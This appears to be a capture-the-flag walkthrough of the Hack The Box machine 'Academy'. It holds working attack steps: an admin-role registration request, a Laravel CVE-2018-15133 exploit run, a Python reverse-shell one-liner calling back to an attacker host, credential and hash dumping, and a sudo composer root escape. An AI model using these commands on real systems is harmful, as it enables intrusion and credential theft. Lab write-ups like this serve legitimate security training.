---
title: Academy/10.10.10.215 (HTB)
published: true
---

# Contributers

* acoozi
* BigTymer37
* j0v1k
* whoamiamleo

# Reconnaissance

## Nmap Network Service Enumeration

```
Nmap scan report for 10.10.10.215
Host is up, received user-set (0.048s latency).
Scanned at 2021-02-06 16:13:05 EST for 20s
Not shown: 65399 closed ports, 133 filtered ports
Reason: 65399 resets and 133 no-responses
PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:8.2p1: 
|       CVE-2020-15778  6.8     https://vulners.com/cve/CVE-2020-15778
|       CVE-2020-12062  5.0     https://vulners.com/cve/CVE-2020-12062
|_      CVE-2020-14145  4.3     https://vulners.com/cve/CVE-2020-14145
80/tcp    open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-jsonp-detection: Couldn't find any JSONP endpoints.
|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn't find wp-login.php
| vulners: 
|   cpe:/a:apache:http_server:2.4.41: 
|       CVE-2020-11984  7.5     https://vulners.com/cve/CVE-2020-11984
|       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927
|       CVE-2020-9490   5.0     https://vulners.com/cve/CVE-2020-9490
|       CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934
|_      CVE-2020-11993  4.3     https://vulners.com/cve/CVE-2020-11993
33060/tcp open  mysqlx? syn-ack
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|_    HY000
```

## DIRB Web Service Enumeration

```
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Mar  3 10:42:20 2021
URL_BASE: http://academy.htb/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://academy.htb/ ----
+ http://academy.htb/admin.php (CODE:200|SIZE:2633)                          
```

# Vertical Privilege Escalation in Web Application

```
POST /register.php HTTP/1.1
Host: academy.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 58
Origin: http://academy.htb
DNT: 1
Connection: close
Referer: http://academy.htb/register.php
Cookie: PHPSESSID=crgm49479bgu86ugm0sm1btstf
Upgrade-Insecure-Requests: 1

uid=leoadmin&password=Password1&confirm=Password1&roleid=1

HTTP/1.1 302 Found
Date: Wed, 03 Mar 2021 15:56:23 GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
location: success-page.php
Content-Length: 3003
Connection: close
Content-Type: text/html; charset=UTF-8

...TRUNCATED...

POST /admin.php HTTP/1.1
Host: academy.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
Origin: http://academy.htb
DNT: 1
Connection: close
Referer: http://academy.htb/admin.php
Cookie: PHPSESSID=crgm49479bgu86ugm0sm1btstf
Upgrade-Insecure-Requests: 1

uid=leoadmin&password=Password1

HTTP/1.1 302 Found
Date: Wed, 03 Mar 2021 15:59:38 GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: admin-page.php
Content-Length: 2633
Connection: close
Content-Type: text/html; charset=UTF-8

...TRUNCATED...

GET /admin-page.php HTTP/1.1
Host: academy.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://academy.htb/admin.php
DNT: 1
Connection: close
Cookie: PHPSESSID=crgm49479bgu86ugm0sm1btstf
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK
Date: Wed, 03 Mar 2021 15:59:38 GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 1480
Connection: close
Content-Type: text/html; charset=UTF-8

...TRUNCATED...
   <td>Fix issue with dev-staging-01.academy.htb</td>
    <td>pending</td>
...TRUNCATED...

GET / HTTP/1.1
Host: dev-staging-01.academy.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

HTTP/1.0 500 Internal Server Error
Date: Wed, 03 Mar 2021 16:04:01 GMT
Server: Apache/2.4.41 (Ubuntu)
Cache-Control: no-cache, private
Connection: close
Content-Type: text/html; charset=UTF-8

...TRUNCATED...
                <td>APP_KEY</td>
                <td><pre class=sf-dump id=sf-dump-1874649812 data-indent-pad="  ">"<span class=sf-dump-str title="51 characters">base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=</span>"
</pre>
...TRUNCATED...
```

# Obtaining Shell

## Laravel exploit for CVE-2018-15133
### [https://github.com/aljavier/exploit_laravel_cve-2018-15133](https://github.com/aljavier/exploit_laravel_cve-2018-15133)

```
python3 pwn_laravel.py http://dev-staging-01.academy.htb/ dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= -i

Linux academy 5.4.0-52-generic #57-Ubuntu SMP Thu Oct 15 10:57:00 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

 Running in interactive mode. Press CTRL+C to exit.
$ export RHOST="10.10.15.145";export RPORT=80;/usr/bin/python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")' &

msf6 exploit(multi/handler) > [*] Command shell session 1 opened (10.10.15.145:80 -> 10.10.10.215:53990) at 2021-03-03 11:15:17 -0500

msf6 exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

$ whoami
whoami
www-data
$ pwd
pwd
/var/www/html/htb-academy-dev-01/public

```

# Host Enumeration

## Password Hashes Found

```
$ cat config.php
cat config.php
<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
$link=mysqli_connect('localhost','root','GkEWXn4h34g8qx9fZ1','academy');
?>
$ mysql -u root -pGkEWXn4h34g8qx9fZ1
mysql -u root -pGkEWXn4h34g8qx9fZ1
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 133
Server version: 8.0.22-0ubuntu0.20.04.2 (Ubuntu)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> SHOW DATABASES;
SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| academy            |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.01 sec)

mysql> use academy;
use academy;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> SELECT * FROM users;
SELECT * FROM users;
+----+----------+----------------------------------+--------+---------------------+
| id | username | password                         | roleid | created_at          |
+----+----------+----------------------------------+--------+---------------------+
|  5 | dev      | a317f096a83915a3946fae7b7f035246 |      0 | 2020-08-10 23:36:25 |
...TRUNCATED...
+----+----------+----------------------------------+--------+---------------------+
9 rows in set (0.00 sec)
```

# Vertical Privledge Escalation in Host Operating System

## Password Cracked

`a317f096a83915a3946fae7b7f035246` was succesfully cracked! The password is: `mySup3rP4s5w0rd!!`

## Composer Root Exploit
### [https://gtfobins.github.io/gtfobins/composer/](https://gtfobins.github.io/gtfobins/composer/)

```
$ su - cry0l1t3
su - cry0l1t3
Password: mySup3rP4s5w0rd!!

$ whoami
whoami
cry0l1t3

$ cat /var/log/audit/audit.log* | grep -i "data="
cat /var/log/audit/audit.log* | grep -i "data="
...TRUNCATED...
type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm="su" data=6D7262336E5F41634064336D79210A
...TRUNCATED...

$ python
python
>>> print("6D7262336E5F41634064336D79210A".decode("hex"))
mrb3n_Ac@d3my!

$ su - mrb3n
su - mrb3n
Password: mrb3n_Ac@d3my!

$ sudo -l 
sudo -l
[sudo] password for mrb3n: mrb3n_Ac@d3my!

Matching Defaults entries for mrb3n on academy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mrb3n may run the following commands on academy:
    (ALL) /usr/bin/composer
$ TF=$(mktemp -d)
TF=$(mktemp -d)
$ echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
$ sudo composer --working-dir=$TF run-script x
sudo composer --working-dir=$TF run-script x
PHP Warning:  PHP Startup: Unable to load dynamic library 'mysqli.so' (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
PHP Warning:  PHP Startup: Unable to load dynamic library 'pdo_mysql.so' (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
Do not run Composer as root/super user! See https://getcomposer.org/root for details
> /bin/sh -i 0<&3 1>&3 2>&3
# whoami
whoami
root
```